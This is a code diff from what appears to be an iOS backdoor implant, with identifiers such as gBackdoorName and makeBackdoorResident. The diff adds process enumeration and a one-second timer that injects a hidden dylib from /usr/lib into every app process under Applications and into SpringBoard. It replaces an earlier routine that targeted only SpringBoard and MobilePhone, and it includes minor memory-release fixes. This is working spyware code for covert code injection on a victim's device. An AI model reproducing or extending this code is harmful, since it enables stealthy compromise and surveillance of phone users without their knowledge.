@@ -39,6 +39,111 @@
 #pragma mark -
 
 extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
+static NSMutableArray *gCurrProcsList = nil;
+
+@interface _i_Proc : NSObject
+{
+  pid_t    mPid;
+  BOOL     mIsInjected;
+  NSString *mName;
+  NSString *mPath;
+}
+
+@property (nonatomic, retain) NSString *mName;
+@property (nonatomic, retain) NSString *mPath;
+@property (readwrite) BOOL mIsInjected;
+@property (readwrite) pid_t mPid;
+
++ (NSMutableArray*)processList;
+
+- (void)dealloc;
+
+@end
+
+@implementation _i_Proc
+
+@synthesize mName;
+@synthesize mPath;
+@synthesize mPid;
+@synthesize mIsInjected;
+
+- (id)initWithPid:(pid_t)aPid
+             name:(NSString*)aName
+             path:(NSString*)aPath
+{
+  self = [super init];
+  
+  if (self != nil)
+  {
+    if (aName != nil)
+      mName = [aName retain];
+    else
+      mName = nil;
+    
+    if (aPath != nil)
+      mPath = [aPath retain];
+    else
+      mPath = nil;
+    
+    mIsInjected = NO;
+    
+    mPid = aPid;
+  }
+  
+  return self;
+}
+- (void)dealloc
+{
+  [mPath release];
+  [mName release];
+  [super dealloc];
+}
+
++ (NSMutableArray*)processList
+{
+  NSMutableArray* procArray = [[NSMutableArray alloc] initWithCapacity:0];
+  
+  int i;
+  kinfo_proc *allProcs = 0;
+  size_t numProcs;
+
+  if (getBSDProcessList (&allProcs, &numProcs))
+    return procArray;
+  
+  for (i = 0; i < numProcs; i++)
+  {
+    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+    
+    pid_t _pid = allProcs[i].kp_proc.p_pid;
+    
+    NSString *path = pathFromProcessID(_pid);
+    NSString *procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
+    
+    if (path != nil)
+    {
+      NSRange range = [path rangeOfString:@"Applications"];
+      
+      if (range.location != NSNotFound || [procName compare:@"SpringBoard"] == NSOrderedSame)
+      {
+        _i_Proc *proc = [[_i_Proc alloc] initWithPid:_pid
+                                                name:procName
+                                                path:path];
+
+        [procArray addObject: proc];
+        
+        [proc release];
+      }
+    }
+    
+    [inner release];
+  }
+
+  free(allProcs);
+
+  return procArray;
+}
+
+@end
 
 @interface _i_Core (hidden)
 
@@ -179,6 +284,8 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
   
   [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
+  [tmpBlob release];
+  
   return TRUE;
 }
 
@@ -193,7 +300,9 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
                                                       configId:0];
   
   [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
-    
+  
+  [tmpBlob release];
+  
   return TRUE;
 }
 
@@ -338,7 +447,7 @@ extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
                                        seed: 2];
   
   gCurrInstanceIDFileName = [_encryption scrambleForward: gBackdoorName
-                                            seed: 10];
+                                                    seed: 10];
 }
 
 #pragma mark -
@@ -405,6 +514,8 @@ typedef struct _coreMessage_t
   [self dispatchToEventManager:  msgData];
   [self dispatchToActionManager: msgData];
   [self dispatchToAgentManager:  msgData];
+  
+  [msgData release];
 }
 
 - (void)manageCoreNotification:(uint)aFlag
@@ -603,8 +714,58 @@ typedef struct _coreMessage_t
 }
 
 #pragma mark -
-#pragma mark Main runloop
+#pragma mark Process Injection
 #pragma mark -
+
+- (void)setInjectedFlag:(_i_Proc*)theProc
+{
+  for (int i=0; i < [gCurrProcsList count]; i++)
+  {
+    _i_Proc *oldProc = [gCurrProcsList objectAtIndex:i];
+    
+    if (([oldProc mPid] == [theProc mPid]) &&
+        ([[oldProc mName] compare:[theProc mName]] == NSOrderedSame))
+    {
+      [theProc setMIsInjected:YES];
+    }
+  }
+}
+
+- (void)updateProcList
+{
+  NSMutableArray *newProcs = [_i_Proc processList];
+  
+  for (int i=0; i < [newProcs count]; i++)
+  {
+    _i_Proc *tmpProc = [newProcs objectAtIndex:i];
+    
+    [self setInjectedFlag: tmpProc];
+  }
+  
+  [gCurrProcsList release];
+  gCurrProcsList = newProcs;
+}
+
+- (void)injectProcesses:(NSTimer*)theTimer
+{
+  char dylibname[256];
+  char dylbPathname[256];
+  
+  [self updateProcList];
+  
+  [gDylibName getCString: dylibname maxLength: 256 encoding:NSUTF8StringEncoding];
+  snprintf(dylbPathname, sizeof(dylbPathname), "/usr/lib/%s", dylibname);
+  
+  for (int i=0; i<[gCurrProcsList count]; i++)
+  {
+    _i_Proc *proc = [gCurrProcsList objectAtIndex:i];
+    
+    if ([proc mIsInjected] == NO)
+    {
+      injectDylibToProc([proc mPid], dylbPathname);
+    }
+  }
+}
 
 - (BOOL)checkAndinjectSB
 {
@@ -618,20 +779,20 @@ typedef struct _coreMessage_t
   pid_t sb_pid = getPidByProcessName(@"SpringBoard");
   pid_t mp_pid = getPidByProcessName(@"MobilePhone");
   
-  if (sb_pid > 0 &&  sb_pid != mSBPid) 
-    {
-      mSBPid = sb_pid;
-
-      [gDylibName getCString: dylibname maxLength: 256 encoding:NSUTF8StringEncoding];
-      snprintf(dylbPathname, sizeof(dylbPathname), "/usr/lib/%s", dylibname);
+  if (sb_pid > 0 &&  sb_pid != mSBPid)
+  {
+    mSBPid = sb_pid;
     
-      if (injectDylibToProc(mSBPid, dylbPathname) == 0)
-        bRet = TRUE;
-      else
-        bRet = FALSE;
-      
-      injectDylibToProc(mp_pid, dylbPathname);
-    }
+    [gDylibName getCString: dylibname maxLength: 256 encoding:NSUTF8StringEncoding];
+    snprintf(dylbPathname, sizeof(dylbPathname), "/usr/lib/%s", dylibname);
+    
+    if (injectDylibToProc(mSBPid, dylbPathname) == 0)
+      bRet = TRUE;
+    else
+      bRet = FALSE;
+    
+    injectDylibToProc(mp_pid, dylbPathname);
+  }
   
   return bRet;
 }
@@ -644,28 +805,42 @@ typedef struct _coreMessage_t
   [self checkAndinjectSB];
 }
 
-- (void)injectSpringBoard
+- (void)startInjection
 {
 #ifdef __DEBUG_IOS_DYLIB
   return;
 #endif
   
-  if ([self checkAndinjectSB] == TRUE)
+  if (gOSMajor >= 6)
+  {
+    NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: 1.0
+                                                     target: self
+                                                   selector: @selector(injectProcesses:)
+                                                    userInfo: nil
+                                                    repeats: YES];
+    
+    [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
+  }
+  else
+    if ([self checkAndinjectSB] == TRUE)
     {
-      NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: 10.0 
+      NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: 10.0
                                                         target: self 
                                                       selector: @selector(checkAndinjectSB:) 
-                                                      userInfo: nil 
+                                                      userInfo: nil
                                                        repeats: YES];
       
       [[NSRunLoop currentRunLoop] addTimer: timer forMode: NSRunLoopCommonModes];
-      [timer release];
     }
-  else
+    else
     {
       [self makeBackdoorResident];
     }
 }
+
+#pragma mark -
+#pragma mark Main runloop
+#pragma mark -
 
 - (void)coreRunLoop
 { 
@@ -684,7 +859,7 @@ typedef struct _coreMessage_t
   
   createInfoLog(@"Start");
   
-  [self injectSpringBoard];
+  [self startInjection];
   
   /*
    * enable main runloop for battery notification
